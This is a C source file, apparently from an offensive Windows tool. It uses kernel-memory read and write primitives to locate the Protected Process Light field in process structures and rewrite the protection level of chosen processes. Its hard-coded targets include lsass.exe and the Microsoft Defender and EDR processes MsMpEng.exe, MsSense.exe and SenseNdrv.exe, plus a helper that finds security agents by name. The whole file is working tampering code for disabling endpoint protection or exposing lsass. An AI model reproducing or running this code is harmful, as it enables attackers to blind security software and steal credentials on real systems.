#include "ft.h"

#include <string.h>

static uint32_t rd32k(const uint8_t* p) {
    return (uint32_t)p[0] | ((uint32_t)p[1] << 8) |
           ((uint32_t)p[2] << 16) | ((uint32_t)p[3] << 24);
}

static int ft_ep_page(ft_ctx* c, uint64_t ep, uint8_t* page) {
    if (ft_km_read_bytes(c, ep, page, 0x400) == FTR_FAIL) return 0;
    return 1;
}

static const char* ft_protected_names[] = {
    "smss.exe", "csrss.exe", "services.exe", "lsass.exe", "wininit.exe",
    "MsMpEng.exe", "MsSense.exe", "SenseNdrv.exe", NULL
};

int ft_ppl_find_agents(ft_ctx* c, const char* const* names, int n,
                       uint32_t* pids, int max) {
    int i;
    int found = 0;
    if (!c || !names || !pids) return 0;
    for (i = 0; i < n && found < max; i++) {
        uint32_t pid = 0;
        if (!ft_proc_find_by_name(c, names[i], &pid) || !pid) continue;
        pids[found++] = pid;
    }
    return found;
}

static int ft_collect_groups(ft_ctx* c, uint64_t* prot, int maxprot,
                             uint64_t* norm, int maxnorm) {
    int i;
    int np = 0;
    int nn = 0;
    uint64_t all[128];
    int n;
    int k;

    for (i = 0; ft_protected_names[i] && np < maxprot; i++) {
        uint32_t pid = 0;
        uint64_t ep = 0;
        if (!ft_proc_find_by_name(c, ft_protected_names[i], &pid) || !pid) continue;
        if (!ft_proc_find_by_pid(c, pid, &ep) || !ep) continue;
        prot[np++] = ep;
    }
    n = ft_proc_walk(c, all, 128, NULL);
    for (k = 0; k < n && nn < maxnorm; k++) {
        int dup = 0;
        int j;
        for (j = 0; j < np; j++) {
            if (all[j] == all[k]) { dup = 1; break; }
        }
        if (dup) continue;
        norm[nn++] = all[k];
    }
    if (np < 1) return 0;
    if (nn < 2) return 0;
    return (np << 16) | (nn & 0xFFFF);
}

int ft_ppl_offset(ft_ctx* c, uint32_t protected_pid, uint32_t* out_offset) {
    uint64_t prot[8];
    uint64_t norm[16];
    uint8_t pp[8][0x400];
    uint8_t np[16][0x400];
    int nprot = 0;
    int nnorm = 0;
    int groups;
    uint32_t off;
    int best_zeros = -1;
    uint32_t best_off = 0;
    int i;

    (void)protected_pid;
    if (!c || !out_offset) return 0;
    *out_offset = 0;

    groups = ft_collect_groups(c, prot, 8, norm, 16);
    if (!groups) return 0;
    nprot = (groups >> 16) & 0xFF;
    nnorm = groups & 0xFFFF;

    for (i = 0; i < nprot; i++) {
        if (!ft_ep_page(c, prot[i], pp[i])) return 0;
    }
    for (i = 0; i < nnorm; i++) {
        if (!ft_ep_page(c, norm[i], np[i])) return 0;
    }

    for (off = 0; off + 4 <= 0x400; off += 4) {
        uint32_t level = 0;
        int zeros = 0;
        int agree = 1;
        int k;

        for (i = 0; i < nprot; i++) {
            uint32_t lv = rd32k(pp[i] + off) & 0xFu;
            if (lv < 1u || lv > 3u) { agree = 0; break; }
            if (i == 0) level = lv;
            else if (lv != level) { agree = 0; break; }
        }
        if (!agree) continue;
        for (k = 0; k < nnorm; k++) {
            if ((rd32k(np[k] + off) & 0xFu) == 0u) zeros++;
        }
        if (zeros < 2) continue;
        if (zeros > best_zeros) {
            best_zeros = zeros;
            best_off = off;
        }
    }
    if (best_zeros < 0) return 0;
    *out_offset = best_off;
    return 1;
}

int ft_ppl_level(ft_ctx* c, uint32_t pid, uint32_t offset, uint32_t* level) {
    uint64_t ep = 0;
    uint8_t buf[4];
    if (!c || !level || !offset) return 0;
    if (!ft_proc_find_by_pid(c, pid, &ep) || !ep) return 0;
    if (ft_km_read_bytes(c, ep + offset, buf, 4) == FTR_FAIL) return 0;
    *level = rd32k(buf) & 0xFu;
    return 1;
}

int ft_ppl_set(ft_ctx* c, uint32_t pid, uint32_t offset, uint32_t level) {
    uint64_t ep = 0;
    uint8_t buf[4];
    uint32_t cur = 0;
    uint32_t after = 0;

    if (!c || !offset) return 0;
    if (!ft_proc_find_by_pid(c, pid, &ep) || !ep) return 0;
    if (ft_km_read_bytes(c, ep + offset, buf, 4) == FTR_FAIL) return 0;
    cur = rd32k(buf);
    if ((cur & 0xFu) == (level & 0xFu)) return 1;

    {
        uint32_t nv = (cur & ~0xFu) | (level & 0xFu);
        unsigned char w[4];
        w[0] = (unsigned char)(nv & 0xFF);
        w[1] = (unsigned char)((nv >> 8) & 0xFF);
        w[2] = (unsigned char)((nv >> 16) & 0xFF);
        w[3] = (unsigned char)((nv >> 24) & 0xFF);
        if (ft_km_write(c, ep + offset, w, 4) != 1) return 0;
    }
    if (ft_km_read_bytes(c, ep + offset, buf, 4) == FTR_FAIL) return 0;
    after = rd32k(buf) & 0xFu;
    if (after != (level & 0xFu)) return 0;
    return 1;
}
